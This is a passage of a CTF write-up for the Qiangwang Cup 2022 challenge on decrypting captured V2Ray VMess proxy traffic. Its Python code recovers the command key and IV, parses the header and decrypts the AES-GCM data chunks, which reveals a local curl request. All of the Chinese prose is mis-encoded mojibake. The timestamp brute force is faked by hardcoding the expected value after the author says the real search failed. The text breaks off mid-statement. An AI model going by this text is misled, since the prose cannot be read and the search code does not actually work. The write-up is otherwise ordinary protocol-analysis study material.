<p>æ ¹æ®è§£å¯†ä¹‹åå¾—åˆ°çš„ä¿¡æ¯å¯ä»¥å‘ç°ï¼Œé™¤äº†<code>å§“å</code>ï¼Œ<code>ç”µè¯</code>ä»¥å¤–ï¼Œè¿˜æœ‰<code>åœ°å€</code>ï¼Œ<code>é“¶è¡Œè´¦å·</code>ä»¥åŠ<code>é‚®ç®±åœ°å€</code>ä¹Ÿè¢«æ³„éœ²äº†ï¼Œå³<code>ADE</code>ã€‚</p>
<h1 id="qwb2022-è°å½±é‡é‡"><a href="#qwb2022-è°å½±é‡é‡" class="headerlink" title="[qwb2022]è°å½±é‡é‡"></a>[qwb2022]è°å½±é‡é‡</h1><blockquote>
<p><a href="https://blog.gztime.cc/posts/2022/fc697ca8/#%E8%B0%8D%E5%BD%B1%E9%87%8D%E9%87%8D">å¼ºç½‘æ¯ 2022 Writeup | GZTimeâ€™s Blog</a></p>
<p><a href="http://www.ehangwang.cn/article/detail/post-548934.html">2022å¹´ç¬¬å…­å±Šâ€œå¼ºç½‘æ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›éƒ¨åˆ†writeup (ehangwang.cn)</a></p>
</blockquote>
<ul>
<li>Route.pcapng</li>
<li>config.json</li>
<li>Amazing.zip</li>
</ul>
<p><code>Amazing.zip</code>ä¸ºåŠ å¯†å‹ç¼©åŒ…ï¼ŒåŠ å¯†æ–‡ä»¶ä¸º<code>flag</code>ï¼ŒåŸºæœ¬åˆ¤æ–­é€šè¿‡å…¶ä»–ä¸¤ä¸ªæ–‡ä»¶å¾—åˆ°å‹ç¼©åŒ…çš„è§£å‹å¯†ç ã€‚æ‰“å¼€å‹ç¼©åŒ…ä¹Ÿå¾—åˆ°äº†æ˜ç¡®çš„æç¤ºã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423153123627.png" class="" title="image-20230423153123627">

<h2 id="vmessåè®®"><a href="#vmessåè®®" class="headerlink" title="vmessåè®®"></a>vmessåè®®</h2><blockquote>
<p>[åè®®ç»†èŠ‚ - VMess åè®® - ã€ŠProject Vï¼ˆV2RAYï¼‰æ–‡æ¡£æ‰‹å†Œã€‹ - ä¹¦æ ˆç½‘ Â· BookStack](<a href="https://www.bookstack.cn/read/V2RAY/developer-protocols-vmess.md#VMess">https://www.bookstack.cn/read/V2RAY/developer-protocols-vmess.md#VMess</a> åè®®)</p>
<p><a href="https://github.com/v2fly/v2ray-core">v2fly&#x2F;v2ray-core: A platform for building proxies to bypass network restrictions. (github.com)</a></p>
</blockquote>
<p>ä¸»è¦å°±æ˜¯çœ‹æ‰‹å†Œåˆ†æåè®®å†…å®¹ï¼Œæ ¹æ®åè®®å®šä¹‰è¿›è¡Œè®¡ç®—ã€‚</p>
<p><strong>æ—¶åˆ»æ³¨æ„è°ƒç”¨å‡½æ•°çš„æ ¼å¼ï¼Œæ˜¯å­—ç¬¦ä¸²è¿˜æ˜¯å­—èŠ‚ï¼æœ¬é¢˜åŸºæœ¬éƒ½æ˜¯å­—èŠ‚ã€‚</strong></p>
<h3 id="åè®®åˆå§‹å®šä¹‰"><a href="#åè®®åˆå§‹å®šä¹‰" class="headerlink" title="åè®®åˆå§‹å®šä¹‰"></a>åè®®åˆå§‹å®šä¹‰</h3><img src="/2023/03/09/MISC-Write-Up-zh/image-20230423163404592.png" class="" title="image-20230423163404592">

<h3 id="è®¡ç®—cmd-keyä»¥åŠcmd-iv"><a href="#è®¡ç®—cmd-keyä»¥åŠcmd-iv" class="headerlink" title="è®¡ç®—cmd_keyä»¥åŠcmd_iv"></a>è®¡ç®—cmd_keyä»¥åŠcmd_iv</h3><p>æ ¹æ®åè®®ï¼Œå…ˆæŠŠæŒ‡ä»¤éƒ¨åˆ†æ±‚è§£å‡ºæ¥ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423154043446.png" class="" title="image-20230423154043446">

<p>æˆ‘ä»¬çš„ç”¨æˆ·IDåœ¨<code>config.json</code>ä¸­ä½“ç°ã€‚</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;clients&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨åŒ¿åå‡½æ•°<code>lambda</code>æŠŠä¸€äº›æœ¬é¢˜çš„å¸¸ç”¨å‡½æ•°ç»™å®šä¹‰ä¸€ä¸‹ï¼Œç®€åŒ–è°ƒç”¨æ­¥éª¤ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md5 = <span class="keyword">lambda</span> x: hashlib.md5(x).hexdigest()</span><br><span class="line">vmess_hmac = <span class="keyword">lambda</span> x: hmac.new(client_id, x, hashlib.md5).hexdigest()</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä»åè®®å®šä¹‰æ¥çœ‹ï¼Œå…³é”®ç‚¹åœ¨<code>M</code>ä¹‹ä¸Šã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ©ç”¨<code>hmac</code>å€¼ï¼Œçˆ†ç ´å‡ºå…³é”®çš„æ—¶é—´ç‚¹<code>M</code>ã€‚</p>
<p><em>ä½†è¿™ä¸€æ­¥è«åå…¶å¦™ä¸€ç›´æ²¡æˆåŠŸï¼Œæ— æ³•çˆ†å‡ºéœ€è¦çš„æ—¶é—´ï¼Œæ‰€ä»¥è¿˜æœ‰å¾…æ”¹è¿›ä¸­ã€‚ä¸æ˜¯pythonç‰ˆæœ¬é—®é¢˜ã€‚</em></p>
<p>æ ¹æ®åè®®æç¤ºï¼Œå†™è·å–<code>M</code>çš„å‡½æ•°ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç†è®ºä¸Š</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cmd_iv</span>(<span class="params">time, target_hash</span>):</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(time - <span class="number">50</span>, time + <span class="number">50</span>):</span><br><span class="line">        cur_hash = vmess_hmac(p64(t))</span><br><span class="line">        <span class="keyword">if</span> cur_hash == target_hash:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;time    = <span class="subst">&#123;t&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> md5(p64(t, endian=<span class="string">&#x27;big&#x27;</span>) * <span class="number">4</span>)</span><br><span class="line"><span class="comment"># ç¡¬å‡‘ç‰ˆ</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cmd_iv</span>(<span class="params">time, target_hash</span>):</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(time - <span class="number">50</span>, time + <span class="number">50</span>):</span><br><span class="line">        cur_hash = vmess_hmac(p64(t))</span><br><span class="line">        <span class="comment"># print(t)</span></span><br><span class="line">        <span class="comment"># print(cur_hash)</span></span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">1615528982</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;time     = <span class="subst">&#123;t&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> md5(p64(t, endian=<span class="string">&#x27;big&#x27;</span>) * <span class="number">4</span>)</span><br></pre></td></tr></table></figure>

<p><em>p64()åœ¨pwntoolsåº“ä¸­ï¼Œéœ€è¦è¿›è¡Œå®‰è£…ã€‚</em></p>
<p><strong>å‰ç½®æ¡ä»¶ï¼Œéœ€è¦æ‰¾åˆ°è¿›è¡Œå“åº”çš„æ•°æ®åŒ…</strong>åŸºæœ¬æ¡ä»¶ï¼šæ—¶é—´è¾ƒæ—©ï¼›æ•°æ®é‡è¾ƒå¤§ï¼›å­˜åœ¨æ•°æ®ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423155136573.png" class="" title="image-20230423155136573">

<p>å¤§æ¦‚çš„æ—¶é—´èŒƒå›´ï¼Œä»¥è¯¥æµé‡åŒ…ä¸­çš„æ—¶é—´è¿›è¡Œæ—¶é—´æˆ³çš„è½¬æ¢ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423155417341.png" class="" title="image-20230423155417341">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423155718632.png" class="" title="image-20230423155718632">

<p>æ‰¾åˆ°å‚ç…§æ—¶é—´æˆ³ä¸º<code>1615528962</code>ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">client_id = uuid.UUID(<span class="string">&#x27;b831381d-6324-4d53-ad4f-8cda48b30811&#x27;</span>).<span class="built_in">bytes</span></span><br><span class="line"></span><br><span class="line">md5 = <span class="keyword">lambda</span> x: hashlib.md5(x).hexdigest()</span><br><span class="line">vmess_hmac = <span class="keyword">lambda</span> x: hmac.new(client_id, x, hashlib.md5).hexdigest()</span><br><span class="line"></span><br><span class="line">req = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;4dd11f9b04f2b562b9db539d939f1d52&#x27;</span> + <span class="string">&#x27;b48b35bf592c09b21545392f73f6cef91143786464578c1c361aa72f638cd0135f25343555f509aef6c74cd2a2b86ee0a9eb3b93a81a541def4763cc54f91ba02681add1b815e8c50e028c76bde0ee8a9593db88d901066305a51a9586a9e377ee100e7d4d33fcfc0453c86b1998a95275cd9368a68820c2a6a540b6386c146ea7579cfe87b2e459856772efdcf0e4c6ab0f11d018a15561cf409cbc00491d7f4d22b7c486a76a5f2f25fbef503551a0aeb90ad9dd246a9cc5e0d0c0b751eb7b54b0abbfef198b1c4e5e755077469c318f20f3e418af03540811ab5c1ea780c886ea2c903b458a26&#x27;</span>)</span><br><span class="line"><span class="comment"># print(req)</span></span><br><span class="line">cut_time = <span class="number">1615528962</span></span><br><span class="line">target_hash = req[:<span class="number">16</span>].<span class="built_in">hex</span>()</span><br><span class="line"><span class="comment"># print(target_hash)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cmd_iv</span>(<span class="params">time, target_hash</span>):</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(time - <span class="number">50</span>, time + <span class="number">50</span>):</span><br><span class="line">        cur_hash = vmess_hmac(p64(t))</span><br><span class="line">        <span class="comment"># print(t)</span></span><br><span class="line">        <span class="comment"># print(cur_hash)</span></span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">1615528982</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;time     = <span class="subst">&#123;t&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> md5(p64(t, endian=<span class="string">&#x27;big&#x27;</span>) * <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">cmd_key = md5(client_id + <span class="string">b&#x27;c48619fe-8f02-49e0-b9e9-edf763e17e21&#x27;</span>)</span><br><span class="line">cmd_iv = get_cmd_iv(cut_time, target_hash)</span><br><span class="line"><span class="comment"># print(type(cmd_iv))</span></span><br><span class="line"><span class="comment"># print(type(cmd_key))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd_key  = <span class="subst">&#123;cmd_key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd_iv   = <span class="subst">&#123;cmd_iv&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># time     = 1615528982</span></span><br><span class="line"><span class="comment"># cmd_key  = &quot;b50d916ac0cec067981af8e5f38a758f&quot;</span></span><br><span class="line"><span class="comment"># cmd_iv   = &quot;881eb47d4d3b67b24328c5178c0eedcc&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="å¯¹æŒ‡ä»¤éƒ¨åˆ†è¿›è¡Œè§£å¯†"><a href="#å¯¹æŒ‡ä»¤éƒ¨åˆ†è¿›è¡Œè§£å¯†" class="headerlink" title="å¯¹æŒ‡ä»¤éƒ¨åˆ†è¿›è¡Œè§£å¯†"></a>å¯¹æŒ‡ä»¤éƒ¨åˆ†è¿›è¡Œè§£å¯†</h3><img src="/2023/03/09/MISC-Write-Up-zh/image-20230423160041040.png" class="" title="image-20230423160041040">

<p>æ ¹æ®åè®®æ‰‹å†Œï¼Œæˆ‘ä»¬äº†è§£æŒ‡ä»¤éƒ¨åˆ†å„å­—èŠ‚çš„æ‰€å±ä»¥åŠä½œç”¨ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åœ¨æ­¤è§£å¯†çš„æ•°æ®æ˜¯æŒ‡ä»¤æ•°æ®ã€‚</p>
<p>åŒæ ·çš„ï¼Œå…ˆåˆ©ç”¨åŒ¿åå‡½æ•°å®šä¹‰æ‰€è¦ä½¿ç”¨çš„<code>AES-128-CFB</code>ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd_aes = <span class="keyword">lambda</span>: AES.new(<span class="built_in">bytes</span>.fromhex(cmd_key), AES.MODE_CFB, <span class="built_in">bytes</span>.fromhex(cmd_iv), segment_size=<span class="number">128</span>)</span><br></pre></td></tr></table></figure>

<p><em><strong>è¿™è¾¹å¾—é«˜äº®ä¸€ä¸‹ï¼Œpython3ä¸­å¯¹ç§°å¯†ç çš„ä½¿ç”¨éå¸¸éº»çƒ¦ï¼Œå› ä¸ºä¸»è¦å¤„ç†çš„æ•°æ®éƒ½æ˜¯å­—èŠ‚å½¢å¼ï¼Œæ­¤å¤„æ³¨æ„ï¼Œä¸èƒ½ç›´æ¥ä½¿ç”¨bâ€™â€™æ¥è¿›è¡Œè½¬æ¢ï¼Œä¼šå¯¼è‡´é•¿åº¦é”™è¯¯ï¼Œå¿…é¡»ä½¿ç”¨<code>bytes.fromhex()</code>è¿›è¡Œè½¬æ¢ã€‚</strong></em></p>
<p><em>AES-128çš„å¯†é’¥é•¿åº¦å¿…é¡»ä¸º16å­—èŠ‚ï¼Œè€Œbâ€™â€™è½¬æ¢æˆå­—èŠ‚æ˜¯32å­—èŠ‚ï¼Œæ‰€ä»¥ä¼šå¯¼è‡´æŠ¥é”™ã€‚</em></p>
<p>æ ¡éªŒ<code>F</code>éƒ¨åˆ†ï¼Œä½¿ç”¨<code>FNV1a hash</code>ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423161516817.png" class="" title="image-20230423161516817">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fnvhash <span class="keyword">import</span> fnv1a_32</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">cmd_aes = <span class="keyword">lambda</span>: AES.new(<span class="built_in">bytes</span>.fromhex(cmd_key), AES.MODE_CFB, <span class="built_in">bytes</span>.fromhex(cmd_iv), segment_size=<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">cmd = req[<span class="number">16</span>:]</span><br><span class="line">ret = cmd_aes().decrypt(cmd)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ver      = <span class="subst">&#123;ret[<span class="number">0</span>:<span class="number">1</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;dat_iv   = <span class="subst">&#123;ret[<span class="number">1</span>:<span class="number">17</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;dat_key  = <span class="subst">&#123;ret[<span class="number">17</span>:<span class="number">33</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;v        = <span class="subst">&#123;ret[<span class="number">33</span>:<span class="number">34</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;opt      = <span class="subst">&#123;ret[<span class="number">34</span>]:b&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p        = <span class="subst">&#123;ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;sec      = <span class="subst">&#123;ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">p = <span class="built_in">int</span>(ret[<span class="number">35</span>:<span class="number">36</span>].<span class="built_in">hex</span>()[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cmd      = <span class="subst">&#123;ret[<span class="number">37</span>:<span class="number">38</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;port     = <span class="subst">&#123;bytes_to_long(ret[<span class="number">38</span>:<span class="number">40</span>])&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;type     = <span class="subst">&#123;ret[<span class="number">40</span>:<span class="number">41</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>) <span class="comment">#ipv4</span></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;host     = <span class="subst">&#123;<span class="string">&#x27;.&#x27;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ret[<span class="number">41</span>:<span class="number">45</span>])&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;rand     = <span class="subst">&#123;ret[<span class="number">45</span>:<span class="number">45</span> + p].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;F        = 0x<span class="subst">&#123;ret[<span class="number">45</span> + p:<span class="number">45</span> + p + <span class="number">4</span>].<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;check    = <span class="subst">&#123;<span class="built_in">hex</span>(fnv1a_32(ret[:<span class="number">45</span> + p]))&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>è¾“å‡ºå¾—åˆ°ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">ver      = 01</span><br><span class="line">dat_iv   = 13277f5732da52ada790d87b8829daa9</span><br><span class="line">dat_key  = 5e4a9aa9ba58c7e3ad36fe2499dca259</span><br><span class="line">v        = a2</span><br><span class="line">opt      = 1101</span><br><span class="line">p        = 6</span><br><span class="line">sec      = 3</span><br><span class="line"></span><br><span class="line">cmd      = 01</span><br><span class="line">port     = 5000</span><br><span class="line">type     = 01</span><br><span class="line"></span><br><span class="line">host     = 127.0.0.1</span><br><span class="line">rand     = 1ace7d9bb0b5</span><br><span class="line">F        = 0x39182c03</span><br><span class="line">check    = 0x39182c03</span><br></pre></td></tr></table></figure>

<h3 id="æ ¹æ®åè®®åå®šä¿¡æ¯è¿›è¡Œè§£å¯†"><a href="#æ ¹æ®åè®®åå®šä¿¡æ¯è¿›è¡Œè§£å¯†" class="headerlink" title="æ ¹æ®åè®®åå®šä¿¡æ¯è¿›è¡Œè§£å¯†"></a>æ ¹æ®åè®®åå®šä¿¡æ¯è¿›è¡Œè§£å¯†</h3><p>åˆ‡åˆ†åå¾—åˆ°çš„åè®®ä¿¡æ¯ï¼Œæ¯”è¾ƒå…³é”®çš„éƒ¨åˆ†ä¸»è¦åœ¨<code>dat_iv</code>ã€<code>dat_key</code>ã€<code>opt</code>ä»¥åŠ<code>sec</code>ä¸­ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423161747894.png" class="" title="image-20230423161747894">

<p>ä½†é€šè¿‡æ–‡æ¡£å‘ç°<code>Opt</code>ç•¥æ˜¾ä¸å¯¹ï¼Œä¸»è¦å› ä¸ºæ–‡æ¡£å¹´ä¹…å¤±ä¿®:)</p>
<blockquote>
<p><a href="https://github.com/v2ray/v2ray-core/blob/5dffca84234a74da9e8174f1e0b0af3dfb2a58ce/common/protocol/headers.go">v2ray-core&#x2F;headers.go at 5dffca84234a74da9e8174f1e0b0af3dfb2a58ce Â· v2ray&#x2F;v2ray-core (github.com)</a></p>
</blockquote>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423162307956.png" class="" title="image-20230423162307956">

<p>æ‰€ä»¥<code>Opt</code>éƒ¨åˆ†ï¼Œä¸»è¦å¼€å¯äº†<code>GlobalPadding</code>ã€<code>ChunkMasking</code>ä»¥åŠ<code>ChunkStream</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—åˆ°ä¿¡æ¯ï¼Œå…ƒæ•°æ®å¼€å¯äº†æ•°æ®æ··æ·†ï¼Œæ‰€ä»¥æˆ‘ä»¬å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åˆ†åˆ«éœ€è¦æ„é€ ä¸¤ä¸ª<code>Shake</code>å®ä¾‹ã€‚å¹¶ä¸”è§£å¯†çš„æ—¶å€™æ³¨æ„<code>Padding</code>ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423163010237.png" class="" title="image-20230423163010237">

<p>è€Œ<code>sec</code>éƒ¨åˆ†ï¼Œä¹Ÿä¸å‡ºæ„å¤–çš„å¹´ä¹…å¤±ä¿®äº†:)</p>
<blockquote>
<p><a href="https://github.com/v2ray/v2ray-core/blob/5dffca84234a74da9e8174f1e0b0af3dfb2a58ce/common/protocol/headers.proto">https://github.com/v2ray/v2ray-core/blob/5dffca84234a74da9e8174f1e0b0af3dfb2a58ce/common/protocol/headers.proto</a></p>
</blockquote>
<p><code>sec=3</code>çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åº”è¯¥é€‰æ‹©<code>AES-128-GCM</code>è¿›è¡Œè§£å¯†ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230421135041930.png" class="" title="image-20230421135041930">

<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423163043222.png" class="" title="image-20230423163043222">

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHAKE128</span><br><span class="line"><span class="comment"># åè®®åˆå§‹å®šä¹‰ä¸­ä½“ç°</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SizeParser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nonce</span>):</span><br><span class="line">        self.shake = SHAKE128.new(nonce)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> bytes_to_long(self.shake.read(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">self, size</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() ^ size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">self, size</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() ^ size</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next_padding</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.<span class="built_in">next</span>() % <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;------------------------------------------------&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">arr, key, iv</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    parser = SizeParser(iv)</span><br><span class="line">    output = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;dat_iv   = <span class="subst">&#123;key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;dat_key  = <span class="subst">&#123;iv.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(arr) &gt; <span class="number">0</span>:</span><br><span class="line">        padding = parser.next_padding()</span><br><span class="line">        L = parser.dec(bytes_to_long(arr[:<span class="number">2</span>])) - padding</span><br><span class="line"></span><br><span class="line">        arr = arr[<span class="number">2</span>:]</span><br><span class="line">        e_iv = p64(count, endian=<span class="string">&#x27;big&#x27;</span>)[<span class="number">6</span>:] + iv[<span class="number">2</span>:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            dec = AES.new(key, AES.MODE_GCM, e_iv).decrypt_and_verify(arr[:L-<span class="number">16</span>], arr[L-<span class="number">16</span>:L])</span><br><span class="line">            output.append(dec)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[!] Decryption failed!&#x27;</span>)</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            arr = arr[L + padding:]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">data = cmd[<span class="number">45</span> + p + <span class="number">4</span>:]</span><br><span class="line">data_iv = ret[<span class="number">1</span>:<span class="number">17</span>]</span><br><span class="line">data_key = ret[<span class="number">17</span>:<span class="number">33</span>]</span><br><span class="line"><span class="comment"># print(type(data_key))</span></span><br><span class="line">pprint(decrypt(data, data_key, data_iv)[<span class="number">0</span>].decode().split(<span class="string">&#x27;\r\n&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è¾“å‡ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dat_iv   = 5e4a9aa9ba58c7e3ad36fe2499dca259</span><br><span class="line">dat_key  = 13277f5732da52ada790d87b8829daa9</span><br><span class="line">[&#x27;GET /out HTTP/1.1&#x27;,</span><br><span class="line"> &#x27;Host: 127.0.0.1:5000&#x27;,</span><br><span class="line"> &#x27;User-Agent: curl/7.75.0&#x27;,</span><br><span class="line"> &#x27;Accept: */*&#x27;,</span><br><span class="line"> &#x27;Connection: close&#x27;,</span><br><span class="line"> &#x27;&#x27;,</span><br><span class="line"> &#x27;&#x27;]</span><br></pre></td></tr></table></figure>

<h3 id="å°†æ‰€æœ‰å“åº”æ•°æ®è¿›è¡Œè§£å¯†"><a href="#å°†æ‰€æœ‰å“åº”æ•°æ®è¿›è¡Œè§£å¯†" class="headerlink" title="å°†æ‰€æœ‰å“åº”æ•°æ®è¿›è¡Œè§£å¯†"></a>å°†æ‰€æœ‰å“åº”æ•°æ®è¿›è¡Œè§£å¯†</h3><p><strong>æ’æ’­ï¼Œå‰é¢éƒ½æ˜¯è¯·æ±‚æ•°æ®ï¼Œæœ¬éƒ¨åˆ†ä¸ºå“åº”æ•°æ®ã€‚</strong></p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423163848309.png" class="" title="image-20230423163848309">

<p>å“åº”æ•°æ®ä¾æ—§ä½¿ç”¨<code>AES-128-CFB</code>è¿›è¡Œè§£å¯†ã€‚</p>
<p>å“åº”æ•°æ®æˆ‘ä»¬å¦‚ä½•å¾—åˆ°ï¼Ÿç›´æ¥åˆ©ç”¨<code>Wireshark</code>è¿½è¸ªæ•°æ®æµåŠŸèƒ½è¿›è¡ŒæŸ¥çœ‹ã€‚å…ˆè½¬æ¢æˆåŸå§‹æ•°æ®ï¼Œå†æŠŠæ‰€æœ‰è“è‰²æ•°æ®å¯¼å‡ºå³å¯ã€‚ä¿å­˜ä¸º<code>res.bytes</code>ã€‚</p>
<img src="/2023/03/09/MISC-Write-Up-zh/image-20230423164122895.png" class="" title="image-20230423164122895">

<p>ä¾æ—§æ ¹æ®åè®®å®šä¹‰å¯¹è§£å¯†åçš„æ•°æ®è¿›è¡Œåˆ‡åˆ†æå–ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="built_in">open</span>(<span class="string">&#x27;res.bytes&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line">res_key = md5(data_key)</span><br><span class="line">res_iv = md5(data_iv)</span><br><span class="line"><span class="comment"># print(res_key)</span></span><br><span class="line"><span class="comment"># print(res_iv)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;res_key  = <span class="subst">&#123;res_key&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;res_iv   = <span class="subst">&#123;res_iv&#125;</span>&quot;</span>)</span><br><span class="line">res_aes = <span class="keyword">lambda</span>: AES.new(<span class="built_in">bytes</span>.fromhex(res_key), AES.MODE_CFB, <span class="built_in">bytes</span>.fromhex(res_iv), segment_size=<span class="number">128</span>)</span><br><span class="line">dec_res = 